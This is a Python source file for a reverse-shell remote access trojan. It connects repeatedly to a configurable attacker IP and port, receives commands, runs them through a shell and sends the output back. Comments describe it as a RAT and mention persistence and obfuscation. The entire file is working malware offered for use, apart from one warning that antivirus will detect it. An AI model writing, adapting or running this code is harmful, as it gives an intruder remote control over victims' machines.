import socket
import subprocess
import os
import sys

# CONFIGURATION
# The attacker's IP and Port. 
# In a real scenario, this might be a hardcoded IP or resolved from a domain.
SERVER_IP = '127.0.0.0'  # Replace with attacker's IP
SERVER_PORT = 9999

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            # If connection fails, wait and retry (persistence/retry logic)
            pass

def main():
    # In a real RAT, this would be obfuscated and run as a background service
    while True:
        try:
            socket_conn = connect()
            while True:
                # Receive command from attacker
                command = socket_conn.recv(1024).decode()
                
                if command.lower() == 'exit':
                    socket_conn.close()
                    break
                
                # Execute command
                # WARNING: This is highly insecure and easily detectable by antivirus
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
                    socket_conn.send(result)
                except subprocess.CalledProcessError as e:
                    socket_conn.send(e.output)
                except Exception as e:
                    socket_conn.send(str(e).encode())
        except:
            # If connection is lost, reconnect
            pass

if __name__ == "__main__":
    main()
